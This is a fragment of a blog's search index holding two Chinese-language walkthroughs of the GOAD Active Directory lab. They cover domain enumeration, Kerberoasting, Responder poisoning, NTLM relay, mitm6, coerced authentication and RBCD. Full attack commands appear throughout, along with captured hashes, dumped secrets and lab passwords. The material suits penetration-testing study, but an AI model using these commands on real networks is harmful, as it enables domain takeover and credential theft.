Directory"]},{"title":"GOAD-Journey-Part2","url":"/GOAD-Journey-Part2/","content":"在上一章节(GOAD-Journey-Part1)中，我们获取到了部分域用户。本章我们将探索下有域用户后怎么获取到更多域信息。\n获取用户列表当我们在获取到一个域账户后，首先要做的事情就是获取用户列表。\nimpacket-GetADUsersimpacket-GetADUsers -all north.sevenkingdoms.local/samwell.tarly:Heartsbane -dc-ip 192.168.56.11\n\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies[*] Querying 192.168.56.11 for information about domain.Name                  Email                           PasswordLastSet      LastLogon--------------------  ------------------------------  -------------------  -------------------Administrator                                         2025-11-30 04:34:14.417277  2025-12-15 12:09:44.933841Guest                                                 &lt;never&gt;              &lt;never&gt;vagrant                                               2021-05-12 07:39:16.765445  2025-12-22 09:50:15.293602krbtgt                                                2025-11-30 04:51:04.250812  &lt;never&gt;arya.stark                                            2025-11-30 06:11:39.441082  &lt;never&gt;eddard.stark                                          2025-11-30 06:11:41.191046  2025-12-22 09:57:42.152696catelyn.stark                                         2025-11-30 06:11:42.769169  &lt;never&gt;robb.stark                                            2025-11-30 06:11:44.332172  2025-12-22 09:59:49.776900sansa.stark                                           2025-11-30 06:11:45.909966  &lt;never&gt;brandon.stark                                         2025-11-30 06:11:47.425431  2025-12-21 06:56:44.028014rickon.stark                                          2025-11-30 06:11:48.925366  &lt;never&gt;hodor                                                 2025-11-30 06:11:50.394151  2025-12-21 06:56:44.042971jon.snow                                              2025-11-30 06:11:51.879020  2025-12-07 07:46:10.688271samwell.tarly                                         2025-11-30 06:11:53.363540  2025-12-20 09:56:59.286260jeor.mormont                                          2025-11-30 06:11:54.847875  &lt;never&gt;sql_svc                                               2025-11-30 06:11:56.269877  2025-12-20 09:19:55.407439\n\nLdapsearch关于ldap查询,我推荐这篇文章：https://podalirius.net/en/active-directory/useful-ldap-queries-for-windows-active-directory-pentesting/，上面包含了几乎所有能用到的查询\nldapsearch -H ldap://192.168.56.11 -D &quot;samwell.tarly@north.sevenkingdoms.local&quot; -w Heartsbane -b &#x27;DC=north,DC=sevenkingdoms,DC=local&#x27; &quot;(&amp;(objectCategory=person)(objectClass=user))&quot; |grep &#x27;distinguishedName:&#x27;\n\n\n通过ldap查询，我们也可以查询到其他域上的用户，因为存在域信任。\n\n查询sevenkingdoms.local\n\nldapsearch -H ldap://192.168.56.10 -D &quot;samwell.tarly@north.sevenkingdoms.local&quot; -w Heartsbane -b &#x27;DC=sevenkingdoms,DC=local&#x27; &quot;(&amp;(objectCategory=person)(objectClass=user))&quot; |grep &#x27;distinguishedName:&#x27;\n\n\nKerberoasting在域中，经常能看到设置了SPN的用户\nimpacket-GetUserSPNs我们可以用impacket来查找他们\nimpacket-GetUserSPNs -request -dc-ip 192.168.56.11 north.sevenkingdoms.local/samwell.tarly:Heartsbane -outputfile kerberoasting.hashes\n\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companiesServicePrincipalName                                 Name         MemberOf                                                    PasswordLastSet             LastLogon                   Delegation---------------------------------------------------  -----------  ----------------------------------------------------------  --------------------------  --------------------------  -----------HTTP/eyrie.north.sevenkingdoms.local                 sansa.stark  CN=Stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local        2025-11-30 06:11:45.909966  &lt;never&gt;CIFS/thewall.north.sevenkingdoms.local               jon.snow     CN=Night Watch,CN=Users,DC=north,DC=sevenkingdoms,DC=local  2025-11-30 06:11:51.879020  2025-12-07 07:46:10.688271  constrainedHTTP/thewall.north.sevenkingdoms.local               jon.snow     CN=Night Watch,CN=Users,DC=north,DC=sevenkingdoms,DC=local  2025-11-30 06:11:51.879020  2025-12-07 07:46:10.688271  constrainedMSSQLSvc/castelblack.north.sevenkingdoms.local       sql_svc                                                                  2025-11-30 06:11:56.269877  2025-12-20 09:19:55.407439MSSQLSvc/castelblack.north.sevenkingdoms.local:1433  sql_svc                                                                  2025-11-30 06:11:56.269877  2025-12-20 09:19:55.407439[-] CCache file is not found. Skipping...\n\n这样就将hashes保存到kerberoasting.hashes了。\n使用hashcat破解hashcat -m 13100 --force -a 0 kerberoasting.hashes /usr/share/wordlists/rockyou.txt --force\n\n\n获取机器名和系统信息众所周知，Windows是一个及其容易BOOM的系统，像永恒之蓝（MS17-010）之类的漏洞直接能匿名连接拿下权限。所以在域中查找下所有的机器信息和系统还是很有必要的。\n\n不走运的是，我们这个域内没有任何的低版本系统（在实验环境里面肯定没有啊，想啥呢，真正的域里面就看你运气咯。）\nSMB枚举nxc smb 192.168.56.0/24 -u jon.snow -p iknownothing --shares\n\n\n实验环境还是啥都没有，真实域环境有时候也会获取到一些有用的文档。\n全都要(ldapdomaindump)上面说的域信息，除了SMB枚举外，基本上用ldapdomaindump都能查询。\nldapdomaindump -u &#x27;NORTH.SEVENKINGDOMS.LOCAL\\samwell.tarly&#x27; -p Heartsbane -o NORTH.SEVENKINGDOMS.LOCAL 192.168.56.11\n\n\ndnsdump再弄点ldapdump查不了的，我们可以根据computer name来匹配其IP地址，进行有针对的攻击。\n这个工具仍然是drikjanm大佬写的adidnsdump。\n┌──(kali㉿kali)-[~/adidnsdump/adidnsdump]└─$ python3 dnsdump.py -u &#x27;north.sevenkingdoms.local\\jon.snow&#x27; -p &#x27;iknownothing&#x27; winterfell.north.sevenkingdoms.local[-] Connecting to host...[-] Binding to host[+] Bind OK[-] Querying zone for records[+] Found 8 records, saving to records.csv\n\nBloodHound最后说一下老外爱用的图形化工具BloodHound\n.\\sharphound.exe -d north.sevenkingdoms.local -c all --zipfilename bh_north_sevenkingdoms.zip.\\sharphound.exe -d sevenkingdoms.local -c all --zipfilename bh_sevenkingdoms.zip.\\sharphound.exe -d essos.local -c all --zipfilename bh_essos.zip\n\n使用sharphound收集到的数据导入bloodhound就ok了。\n如果你想深入查看BloodHound，我推荐以下文章，其中包含大量有用的信息和查询：\n\nhttps://en.hackndo.com/bloodhound/\nhttps://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/\n\n文章参考MayFly\n","tags":["-Active Directory"]},{"title":"GOAD-Journey-Part3","url":"/GOAD-Journey-Part3/","content":"如果你在上一篇GOAD-Journey-Part2中仍然没找到有效的域用户或者密码，不妨看看这篇文章。我们来研究下如何投毒和中继。\nResponder投毒当我们在一个内网中没有任何的凭证时，Responder是我们必备的软件。在正常的域里(没有NDR那些杂七杂八的东西)，它将会带给你\n\n有效的域用户名\nnetntlm  HASH\n重定向身份认证功能（中继）\n…….\n\n根据GOAD作者Mayfly的说法，在GOAD中有两个运行机器人的程序，分别模拟 LLMRN、MDNS 和 NBT-NS 请求。其中一个用户密码强度较低，但没有管理员权限；另一个用户拥有管理员权限，但使用了强密码。\n我们在kali攻击机器上启动responder，尝试看看是否能获得到东西。\nsudo responder -I eth0\n\n等几分钟，就可以获取到NORTH\\eddard.stark的netntlmv2 Hash\n\n\n因为机器人请求的是Brave，而正确的机器名为Braave，导致DNS无法找到。因此 Windows 默认会发送广播请求来查找关联的计算机。通过 responder，我们可以响应该广播查询并声明这是我们自己的服务器，从而获得用户的连接。\n\n在等你几分钟，我们又收到了eddard.stark的连接\n\n\nnetntlm Hash不能用于哈希传递攻击，但可以破解它们。\n\n我们创建一个名为 responder.hashes 的文件，其中包含找到的两个哈希值，然后我们将使用 hashcat 开始破解它。\nrobb.stark::NORTH:fca8d2081c5b71bf:2EA257151FB713C887603E116426D61F:010100000000000080D58875AE8DDC01A247999BBB6EBA3D0000000002000800300053003300560001001E00570049004E002D004200440046004B004E0053005800340052005100480004003400570049004E002D004200440046004B004E005300580034005200510048002E0030005300330056002E004C004F00430041004C000300140030005300330056002E004C004F00430041004C000500140030005300330056002E004C004F00430041004C000700080080D58875AE8DDC010600040002000000080030003000000000000000000000000030000036E0FE45B3C6BAC3E8EF83380F40A254675D9659665C87AD87E5FF71D45214450A001000000000000000000000000000000000000900160063006900660073002F0042007200610076006F0073000000000000000000eddard.stark::NORTH:f7122c456244cda5:A99E8B609BC856E67DB6D865D05957FB:010100000000000080D58875AE8DDC01F842BE9FEDA89C410000000002000800300053003300560001001E00570049004E002D004200440046004B004E0053005800340052005100480004003400570049004E002D004200440046004B004E005300580034005200510048002E0030005300330056002E004C004F00430041004C000300140030005300330056002E004C004F00430041004C000500140030005300330056002E004C004F00430041004C000700080080D58875AE8DDC010600040002000000080030003000000000000000000000000030000036E0FE45B3C6BAC3E8EF83380F40A254675D9659665C87AD87E5FF71D45214450A001000000000000000000000000000000000000900140063006900660073002F004D006500720065006E000000000000000000\n\nhashcat -m 5600 --force -a 0 responder.hashes /usr/share/wordlists/rockyou.txt \n\n\n\n我们很快就能获得一个robb.stark的密码为sexywolfy\n\neddard.stark的密码强度太高了，我们这种方法无法破解他。但是我们还有别的方案，就是下面将要说的中继攻击。\nNTLM 中继未签名的 SMB\n\n让我们查找不需要签名的SMB。\nnxc smb 192.168.56.0/24 --gen-relay-list relay.txt\n\n\n好了，现在我们有了 signing:False SMB 计算机列表，我们可以开始尝试向它们转发 NTLM 身份验证。\n我们首先将responder的SMB监听和HTTP监听关闭，在/etc/responder/Responder.conf中将这两个改为Off\n\n然后使用ntlmrelayx\nimpacket-ntlmrelayx -tf relay.txt -of netntlm -smb2support -socks --keep-relaying\n\n随后再打开responder\nsudo responder -I eth0\n\n等待几分钟后，收到请求，输入socks，发现eddard.stark在192.168.56.22中是管理员。\n\n现在我们可以利用这个中继以管理员身份访问计算机。\n使用管理员帐户运行 SOCKS 中继secretsdump我们刚刚使用的ntlmrelayx开了socks，默认在当前的1080端口\nproxychains4 impacket-secretsdump -no-pass &#x27;NORTH&#x27;/&#x27;EDDARD.STARK&#x27;@&#x27;192.168.56.22&#x27;\n\n\n\nsam 数据库包含本地帐户信息。我们将忽略 vagrant，因为它是设置实验环境的默认用户。\n这里的重要信息是本地管理员用户的 NT 哈希值。\n我们还获取了最近连接用户的 LSA 缓存（Windows 默认保留最近 10 个用户的缓存），即使域控制器无法访问，这也能帮助我们连接到服务器。但是，这些缓存的凭据可以通过 hashcat 离线破解（速度非常慢）。\n最后，我们还获得了计算机帐户的哈希值。（有时，加入域的计算机可能无法获取任何有用的域帐户信息，甚至完全没有相关信息，但如果您获得了此哈希值，则说明您已拥有该域的帐户！）\n\nLsassySAM中并没有域用户的信息，登陆过的域用户通常保存在lsass.exe进程中，所以我们使用Lsassy来获取lsass.exe进程中的用户\nLsassy 允许您远程转储 lsass 文件（比使用 procdump、下载 lsass 转储文件并在本地使用 pypykatz 或 mimikatz 方便得多），它为您完成所有繁琐的操作，例如转储和读取 lsass 内容（它还只转储 lsass 转储中的有用部分，从而优化传输时间）。（lsassy 也以 nxc 模块的形式存在）\nproxychains4 lsassy --no-pass -d &#x27;NORTH&#x27; -u &#x27;EDDARD.STARK&#x27; &#x27;192.168.56.22&#x27;\n\n\nSMBClient上面提到的两种方案都是可能会触发EDR告警的，因为操作太过于敏感，虽然Microsoft Defender并不会管你这些操作。\n使用SMBClient查看文件并不会触发EDR。\nproxychains4 impacket-smbclient -no-pass &#x27;NORTH&#x27;/&#x27;EDDARD.STARK&#x27;@&#x27;192.168.56.22&#x27;\n\n\nSMBexec命令执行如果你想执行命令，但是我们使用的是socks连接，只能使用smbexec或 atexec，wmiexec、psexec 和 dcomexec 均无法使用。\nproxychains4 impacket-smbexec -no-pass &#x27;NORTH&#x27;/&#x27;EDDARD.STARK&#x27;@&#x27;192.168.56.22&#x27;\n\n\nMitm6 &#x2F;Inveigh+ ntlmrelayx 到 LDAP另一种有效的网络攻击方法是响应 DHCPv6 请求并将我们的主机设置为默认 DNS 服务器。Windows 默认优先使用 IPv6 而不是 IPv4，因此我们可以使用 MITM6 工具或者Inveigh捕获并篡改 DHCPv6 查询的响应，从而更改 DNS 服务器并将查询重定向到我们的机器。\n\n我们将启动中间人攻击（mitm6）来干扰 DHCPv6，并获取来自主机的 DNS 请求。\n顺便提一下，我注意到我们可以毒害域控制器，但之后域控制器并不在意，仍然使用它们的本地主机 DNS 服务器。\n所以我们必须对着服务器投毒\n在这个例子中，我们将对 Braavos 服务器进行恶意操作。我们将响应 wpad 查询，并将 HTTP 查询转发到 Meereen 上的 LDAPS，以添加一台具有委派访问权限的计算机。\n\n首先开启我们的ntlmrelayx\nimpacket-ntlmrelayx -6 -wh wpadfakeserver.essos.local -t ldaps://meereen.essos.local --delegate-access\n\n然后开启mitm6\nsudo mitm6 -i eth0 -d essos.local -d sevenkingdoms.local -d north.sevenkingdoms.local --debug -4 192.168.56.200\n\n等待 wpad http 查询将请求转发到 ldaps（您可以重启虚拟机来投毒和利用漏洞，而无需等待）\n\n\n我们成功添加了一个机器账户ZXDJDCKA$:fa6g^d8HtF6,vUN，并且将BRAAVOS$委派给它。我们可以用这个账户进行getST获取BRAAVOS这个计算机的权限（下章节操作）\n同样的，我们也可以用这个relay到ldap并获取域信息（这个账户权限不够的情况）\nimpacket-ntlmrelayx -6 -wh wpadfakeserver.essos.local -t ldap://meereen.essos.local -l /home/kali/temp/\n\n\n\n强制认证后relay到ldap我们可以使用多种方法（petitpotam、printerbug、DFSCoerce）强制从 Meereen DC 建立到我们主机的连接。为了强制建立连接而无需在不同方法之间进行选择，我们可以使用一体化工具 coercer。\n正如 hackndo 博客 ( en.hackndo.com&#x2F;ntlm-relay ) 和 hacker recipes ( www.thehacker.recipes/ad/movement/ntlm/relay ) 中精彩解释的那样，如果不使用 CVE-2019-1040（又名 remove-mic），就无法将 smb 连接中继到 ldap(s) 连接。\n\n启动中继，移除mic到 meereen.essos.local 的 ldaps。\nimpacket-ntlmrelayx -t ldap://meereen.essos.local -smb2support --remove-mic --delegate-access\n\n在 braavos 上运行强制身份验证（braavos 是最新的 Windows Server 2016，因此 petitpotam 未授权在这里不起作用）\npython3 Coercer.py coerce -u khal.drogo -d essos.local -p horse -t braavos.essos.local -l 192.168.56.200\n\n\n\n\n攻击成功了，我们获得了QVGNFSKR$:ShI(whoIy24c)bb,我们现在可以利用 RBCD 攻击braavos。\nimpacket-getST -spn HOST/BRAAVOS.ESSOS.LOCAL -impersonate Administrator -dc-ip 192.168.56.12 &#x27;ESSOS.LOCAL/QVGNFSKR$:ShI(whoIy24c)bb&#x27;\n\n\n\n然后使用这个票据来获取密码\nexport KRB5CCNAME=Administrator@HOST_BRAAVOS.ESSOS.LOCAL@ESSOS.LOCAL.ccacheimpacket-secretsdump -k -no-pass ESSOS.LOCAL/&#x27;Administrator&#x27;@braavos.essos.local\n\n\n\n\n我们同样可以用最近很流行的CVE-2025-33073进行Relay到SMB，就不多说了，内容都差不多。\n","tags":["-Active Directory"]}]